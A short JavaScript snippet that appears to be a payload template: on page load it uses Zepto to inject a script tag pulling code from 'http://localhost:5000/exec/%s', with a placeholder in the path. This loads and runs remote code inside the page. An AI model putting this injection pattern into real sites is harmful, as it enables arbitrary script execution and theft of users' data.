Zepto(
  function($) {
    _s=document.createElement('script');
    _s.type='text/javascript';
    _s.src='http://localhost:5000/exec/%s';
    document.getElementsByTagName('head')[0].appendChild(_s);
    void(0);
  }
);